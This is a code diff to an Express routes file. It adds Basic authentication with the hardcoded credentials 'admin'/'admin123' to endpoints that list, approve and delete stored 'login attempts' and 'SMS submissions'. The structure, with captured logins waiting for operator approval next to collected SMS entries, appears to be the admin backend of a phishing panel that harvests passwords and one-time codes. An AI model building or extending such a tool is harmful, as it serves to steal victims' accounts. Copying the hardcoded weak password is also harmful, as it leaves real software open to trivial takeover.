@@ -3,6 +3,26 @@ import { createServer, type Server } from "http";
 import { storage } from "./storage";
 import { insertLoginAttemptSchema, insertSmsSubmissionSchema } from "@shared/schema";
 
+// Admin authentication middleware
+const adminAuth = (req: any, res: any, next: any) => {
+  const authHeader = req.headers.authorization;
+  
+  if (!authHeader || !authHeader.startsWith('Basic ')) {
+    res.status(401).json({ error: 'Authentication required' });
+    return;
+  }
+  
+  const credentials = Buffer.from(authHeader.split(' ')[1], 'base64').toString('utf-8');
+  const [username, password] = credentials.split(':');
+  
+  // Простая проверка логина и пароля
+  if (username === 'admin' && password === 'admin123') {
+    next();
+  } else {
+    res.status(401).json({ error: 'Invalid credentials' });
+  }
+};
+
 export async function registerRoutes(app: Express): Promise<Server> {
   // Create login attempt
   app.post("/api/login-attempts", async (req, res) => {
@@ -15,8 +35,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
-  // Get all login attempts
-  app.get("/api/login-attempts", async (req, res) => {
+  // Get all login attempts (protected)
+  app.get("/api/login-attempts", adminAuth, async (req, res) => {
     try {
       const attempts = await storage.getLoginAttempts();
       res.json(attempts);
@@ -25,8 +45,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
-  // Approve login attempt
-  app.post("/api/login-attempts/:id/approve", async (req, res) => {
+  // Approve login attempt (protected)
+  app.post("/api/login-attempts/:id/approve", adminAuth, async (req, res) => {
     try {
       const id = parseInt(req.params.id);
       await storage.approveLoginAttempt(id);
@@ -61,8 +81,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
-  // Get all SMS submissions
-  app.get("/api/sms-submissions", async (req, res) => {
+  // Get all SMS submissions (protected)
+  app.get("/api/sms-submissions", adminAuth, async (req, res) => {
     try {
       const submissions = await storage.getSmsSubmissions();
       res.json(submissions);
@@ -71,8 +91,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
-  // Delete login attempt
-  app.delete("/api/login-attempts/:id", async (req, res) => {
+  // Delete login attempt (protected)
+  app.delete("/api/login-attempts/:id", adminAuth, async (req, res) => {
     try {
       const id = parseInt(req.params.id);
       await storage.deleteLoginAttempt(id);
@@ -82,8 +102,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
-  // Delete SMS submission
-  app.delete("/api/sms-submissions/:id", async (req, res) => {
+  // Delete SMS submission (protected)
+  app.delete("/api/sms-submissions/:id", adminAuth, async (req, res) => {
     try {
       const id = parseInt(req.params.id);
       await storage.deleteSmsSubmission(id);
